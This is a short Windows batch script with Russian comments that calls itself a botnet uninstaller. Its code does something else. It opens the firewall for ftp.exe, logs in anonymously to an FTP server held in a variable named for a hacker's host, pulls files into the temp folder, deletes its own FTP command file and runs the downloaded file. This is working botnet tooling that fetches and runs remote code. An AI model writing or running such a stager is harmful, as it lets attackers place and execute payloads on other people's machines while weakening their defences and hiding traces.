@echo off
rem Программа деинсталляции ботнета
rem USAGE
rem uninstall.cmd <секретная папка> <секретный файл>

rem переходим во временный каталог
C:
cd %TEMP%

::Временный файл команд для утилиты FTP.exe
set CommFTP="c:\pub1\Initial_Script.txt"


rem Разрешаем все протоколы для ftp.exe в брандмауэре
netsh advfirewall firewall add rule name="FTP.EXE Application" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
rem Определяем переменные:
rem FTP Host
set host=%Hacker_host1%
rem FTP Port
set port=21
rem Ftp User
set user=Anonymous
rem FTP Password
set password=
rem Основная папка
set Mainfolder=
rem Папка внутри FTP архива
set SubFolder=Util
rem Папка внутри FTP архива
set SubFolder1=%1
rem Маска для файлов
set fileMask=%2
rem Локальный каталог
set LocalFolder=%TEMP%
 
 
::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolder%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

::Запускаем на выполнение пакетник
%TEMP%\%2
rem Конец
0
